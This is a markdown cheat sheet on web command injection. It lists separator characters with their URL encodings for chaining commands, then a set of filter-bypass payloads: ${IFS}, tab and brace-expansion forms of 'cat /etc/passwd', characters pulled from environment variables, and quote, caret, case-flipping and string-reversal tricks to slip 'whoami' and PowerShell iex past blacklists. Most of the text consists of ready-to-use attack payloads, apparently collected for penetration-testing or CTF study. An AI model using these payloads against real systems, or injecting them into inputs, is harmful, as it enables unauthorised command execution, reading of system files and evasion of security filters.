#Need to add encoding and the rest

<h1>Web</h1>
<h2>Command Injection</h2>
<h3>Detection</h3>

| Character | URL-encoded Character | Executed Command |
| :-----------: | -------------------- | ----------------- |
|   ;  | %3b       | Both                                       |
|  \n  | %0a       | Both                                       |
|   &  | %26       | Both (second output generally shown first) |
|  \|  | %7c       | Both (only second output is shown)         |
|  &&  | %26%26    | Both (only if first succeeds)              |
| \|\| | %7c%7c    | Second (only if first fails)               |
|  ``  | %60%60    | Both (Linux-only)                          |
|  $() | %24%28%29 | Both (Linux-only)                          |

<h3>Bypassing filters</h3>
<h4>Using Tabs</h4>

```bash
cat%09/etc/passwd
```

<h4>Using ${IFS}</h4>

```bash
cat${IFS}/etc/passwd
```

<h4>Using Brace Expansion</h4>

```bash
{cat,/etc/passwd}
```

<h4>Using Characters from Environment Variables</h4>
<h5>Linux</h5>

```bash
echo ${PATH:0:1}
/
```
```bash
echo ${LS_COLORS:10:1}
;
```
>print all env in Linux
```bash
printenv
```

<h5>Windows</h5>
CMD

```cmd
echo %HOMEPATH:~6,-11%
\
```
PowerShell

```powershell
$env:HOMEPATH[0]
\
```
>print all env in Windows PowerShell

```PowerShell
Get-ChildItem Env:
```

<h4>Using Characters Shifting</h4>

```bash
man ascii     # \ is on 92, before it is [ on 91
echo $(tr '!-}' '"-~'<<<[)
\
```

<h4>Bypassing Commands Blacklist</h4>

<h5>Linux and Windows</h5>

Adding '
```bash
w'h'o'am'i
```
Adding "

```bash
w"h"o"am"i
```
>You can't mix types of quotes and the number of quotes must be even

<h5>Linux only</h5>
Adding $@

```bash
who$@ami
```
Case manipulation

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

```bash
$(a="WhOaMi";printf %s "${a,,}")
```
Reversed commands

```bash
$(rev<<<'imaohw')
```
<h5>Windows only</h5>
Adding ^

```cmd
who^ami
```

Case manipulation
```powershell
WhOaMi
```

Reversed commands

```PowerShell
iex "$('imaohw'[-1..-20] -join '')"
```

<h3>Additional links</h3>

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
